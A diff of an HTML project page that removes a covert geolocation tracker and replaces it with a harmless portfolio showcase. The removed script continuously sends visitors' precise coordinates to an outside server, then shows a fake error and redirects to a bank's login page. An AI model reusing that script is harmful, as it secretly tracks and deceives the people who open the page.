@@ -1,61 +1,361 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Live Location Tracker</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Location Page - Project Demo</title>
   <style>
+    :root {
+      color-scheme: dark;
+      --bg: #07111f;
+      --panel: rgba(12, 22, 39, 0.94);
+      --panel-2: rgba(17, 29, 51, 0.94);
+      --line: rgba(148, 163, 184, 0.16);
+      --text: #e5eefb;
+      --muted: #9eb1cc;
+      --accent: #7dd3fc;
+      --accent-2: #60a5fa;
+      --shadow: 0 24px 70px rgba(0, 0, 0, 0.34);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: Arial, sans-serif;
+      margin: 0;
+      font-family: Inter, Arial, sans-serif;
+      background:
+        radial-gradient(circle at top, rgba(96, 165, 250, 0.16), transparent 28%),
+        linear-gradient(180deg, #09111f 0%, var(--bg) 100%);
+      color: var(--text);
+      min-height: 100vh;
+    }
+
+    .page {
+      width: min(1100px, calc(100% - 40px));
+      margin: 0 auto;
+      padding: 28px 0 44px;
+    }
+
+    .topbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 34px;
+      flex-wrap: wrap;
+    }
+
+    .brand {
+      font-size: 1rem;
+      font-weight: 700;
+      letter-spacing: 0.02em;
+    }
+
+    .pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 14px;
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      color: var(--muted);
+      background: rgba(15, 23, 42, 0.55);
+      text-decoration: none;
+      font-size: 0.92rem;
+    }
+
+    .hero {
+      display: grid;
+      grid-template-columns: minmax(0, 1.35fr) minmax(280px, 0.9fr);
+      gap: 22px;
+      align-items: stretch;
+      margin-bottom: 22px;
+    }
+
+    .panel {
+      border: 1px solid var(--line);
+      border-radius: 24px;
+      background: linear-gradient(180deg, var(--panel), rgba(8, 15, 28, 0.98));
+      box-shadow: var(--shadow);
+    }
+
+    .hero-copy {
+      padding: 34px;
+    }
+
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 14px;
+      border-radius: 999px;
+      border: 1px solid rgba(125, 211, 252, 0.28);
+      background: rgba(125, 211, 252, 0.08);
+      color: var(--accent);
+      font-size: 0.88rem;
+      margin-bottom: 18px;
+    }
+
+    h1 {
+      margin: 0 0 14px;
+      font-size: clamp(2.2rem, 4vw, 4.1rem);
+      line-height: 1.05;
+      letter-spacing: -0.03em;
+    }
+
+    h1 span {
+      color: var(--accent);
+    }
+
+    .lede {
+      max-width: 62ch;
+      margin: 0 0 24px;
+      color: var(--muted);
+      line-height: 1.8;
+      font-size: 1.03rem;
+    }
+
+    .actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+
+    .button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      min-height: 44px;
+      padding: 0 16px;
+      border-radius: 12px;
+      border: 1px solid transparent;
+      text-decoration: none;
+      font-weight: 600;
+      transition: transform 0.2s ease, border-color 0.2s ease, background 0.2s ease;
+    }
+
+    .button:hover {
+      transform: translateY(-1px);
+    }
+
+    .button.primary {
+      background: linear-gradient(135deg, var(--accent), var(--accent-2));
+      color: #ffffff;
+    }
+
+    .button.secondary {
+      background: transparent;
+      border-color: rgba(125, 211, 252, 0.28);
+      color: var(--text);
+    }
+
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 12px;
+    }
+
+    .stat {
+      padding: 16px;
+      border-radius: 18px;
+      background: rgba(15, 23, 42, 0.72);
+      border: 1px solid rgba(148, 163, 184, 0.12);
+    }
+
+    .stat strong {
+      display: block;
+      margin-bottom: 6px;
+      color: #ffffff;
+      font-size: 1.1rem;
+    }
+
+    .stat span {
+      color: var(--muted);
+      line-height: 1.6;
+      font-size: 0.95rem;
+    }
+
+    .preview {
+      padding: 24px;
+      display: grid;
+      gap: 16px;
+      align-content: start;
+    }
+
+    .preview-card {
+      padding: 18px;
+      border-radius: 18px;
+      background: linear-gradient(180deg, var(--panel-2), rgba(9, 17, 31, 0.95));
+      border: 1px solid rgba(148, 163, 184, 0.12);
+    }
+
+    .preview-card h2,
+    .section h2 {
+      margin: 0 0 10px;
+      font-size: 1.08rem;
+      color: #ffffff;
+    }
+
+    .preview-card p,
+    .section p {
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.7;
+    }
+
+    .chips {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 14px;
+    }
+
+    .chip {
+      padding: 8px 12px;
+      border-radius: 999px;
+      background: rgba(96, 165, 250, 0.08);
+      border: 1px solid rgba(96, 165, 250, 0.18);
+      color: #cfe7ff;
+      font-size: 0.88rem;
+    }
+
+    .section {
+      padding: 18px 0 0;
+      display: grid;
+      gap: 16px;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 16px;
+    }
+
+    .mini-card {
+      padding: 18px;
+      border-radius: 20px;
+      background: rgba(13, 20, 37, 0.9);
+      border: 1px solid rgba(148, 163, 184, 0.12);
+    }
+
+    .mini-card h3 {
+      margin: 0 0 10px;
+      font-size: 1rem;
+    }
+
+    .mini-card p {
+      font-size: 0.95rem;
+    }
+
+    .footer {
+      padding-top: 24px;
+      color: #8194b0;
+      font-size: 0.93rem;
       text-align: center;
-      padding-top: 100px;
-      background-color: #f0f2f5;
     }
-    h2 {
-      color: #333;
-    }
-	#loading {
-      color: #555;
-      font-size: 16px;
-      margin-top: 20px;
+
+    @media (max-width: 900px) {
+      .hero,
+      .grid {
+        grid-template-columns: 1fr;
+      }
+
+      .stats {
+        grid-template-columns: 1fr;
+      }
     }
   </style>
 </head>
 <body>
-  <p id="loading">Please wait...</p>
+  <main class="page">
+    <div class="topbar">
+      <div class="brand">Shivendra Singh · Location Page</div>
+      <a class="pill" href="https://github.com/Shivendra04singh/location-page" target="_blank" rel="noreferrer">
+        View on GitHub
+      </a>
+    </div>
 
-  <script>
-    function sendLocation(position) {
-      const { latitude, longitude } = position.coords;
-      const timestamp = new Date().toISOString();
+    <section class="hero">
+      <div class="panel hero-copy">
+        <div class="eyebrow">Live project demo</div>
+        <h1>A smaller <span>location concept</span> built for a cleaner portfolio.</h1>
+        <p class="lede">
+          This page now works as a safe, simple showcase project: fast to load,
+          easy to scan, and honest about what it is. It gives your portfolio a
+          second live destination without using anything sensitive or deceptive.
+        </p>
 
-      fetch("https://location-tracker-balt.onrender.com/receive-location", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ latitude, longitude, timestamp })
-      })
-      .then(() => {
-        document.body.innerHTML = "<h2>Something went wrong. Please try again!</h2>";
-		// Redirect after successful sending
-		setTimeout(() => {
-          window.location.href = "https://netbanking.hdfcbank.com/netbanking/";
-        }, 1000);
-      })
-      .catch(() => {
-        console.log("Failed to fetch location");
-      });
-    }
+        <div class="actions">
+          <a class="button primary" href="https://github.com/Shivendra04singh/location-page" target="_blank" rel="noreferrer">
+            GitHub Repo
+          </a>
+          <a class="button secondary" href="https://shivendra04singh.github.io/portfolio/" target="_blank" rel="noreferrer">
+            Back to Portfolio
+          </a>
+        </div>
 
-    function handleError(error) {
-      document.body.innerHTML = `<h2>Something went wrong. Please try again...</h2>`;
-    }
+        <div class="stats">
+          <div class="stat">
+            <strong>Static</strong>
+            <span>One-file project, easy to maintain and deploy.</span>
+          </div>
+          <div class="stat">
+            <strong>Responsive</strong>
+            <span>Layout adapts cleanly on desktop and mobile.</span>
+          </div>
+          <div class="stat">
+            <strong>Portfolio-ready</strong>
+            <span>Built to sit beside your main portfolio project.</span>
+          </div>
+        </div>
+      </div>
 
-    if (navigator.geolocation) {
-      navigator.geolocation.watchPosition(sendLocation, handleError, {
-        enableHighAccuracy: true,
-        maximumAge: 0,
-        timeout: 5000
-      });
-    }
-  </script>
+      <aside class="panel preview">
+        <div class="preview-card">
+          <h2>Project Snapshot</h2>
+          <p>
+            A compact experience for showing a second public project in your
+            portfolio, with clear links and no filler content.
+          </p>
+          <div class="chips">
+            <span class="chip">HTML</span>
+            <span class="chip">CSS</span>
+            <span class="chip">Responsive UI</span>
+          </div>
+        </div>
+
+        <div class="preview-card">
+          <h2>What it demonstrates</h2>
+          <p>
+            Clean layout decisions, restrained styling, and a project page that
+            feels intentional rather than placeholder-like.
+          </p>
+        </div>
+      </aside>
+    </section>
+
+    <section class="section">
+      <div class="grid">
+        <div class="mini-card">
+          <h3>Readable structure</h3>
+          <p>Sections are compact and easy to scan, so the page feels polished even as a small project.</p>
+        </div>
+        <div class="mini-card">
+          <h3>Honest positioning</h3>
+          <p>The page says exactly what it is and avoids pretending to be something it is not.</p>
+        </div>
+        <div class="mini-card">
+          <h3>Easy portfolio slot</h3>
+          <p>This gives your Projects section a second live link that is real, public, and safe to share.</p>
+        </div>
+      </div>
+    </section>
+
+    <div class="footer">Location Page · Public demo project</div>
+  </main>
 </body>
 </html>
